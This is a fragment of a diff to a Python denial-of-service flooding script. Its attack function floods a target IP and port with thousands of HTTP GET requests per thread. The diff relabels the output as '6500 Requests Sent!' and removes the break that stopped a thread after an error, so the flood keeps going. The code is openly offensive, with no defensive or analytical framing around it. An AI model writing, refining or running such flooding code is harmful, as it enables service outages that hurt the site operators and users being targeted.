@@ -100,15 +100,14 @@ def attack(ip, port, threadNum):
                 print("[*] Thread (%s) | Attack Sent!" % (threadNum))
             else:
                 s.connect((ip, port))
-                for _ in range(6500):
+                for _ in range(6500):  # Adjusted the loop to send 6500 requests
                     s.send(("GET /%s HTTP/1.1\r\n" % (url)).encode('utf-8'))
                     s.send("Host: %s\r\n\r\n" % (url))
                 s.close()
-                print("[*] Thread (%s) | Attack Sent!" % (threadNum))
+                print("[*] Thread (%s) | 6500 Requests Sent!" % (threadNum))
         except urllib.error.URLError as e:
             print("[*] Thread (%s) | URL or IP not valid!" % (threadNum))
             print("[*] Thread (%s) | Attack stopped." % (threadNum))
-            break
 
 def flood_url():
     while True:
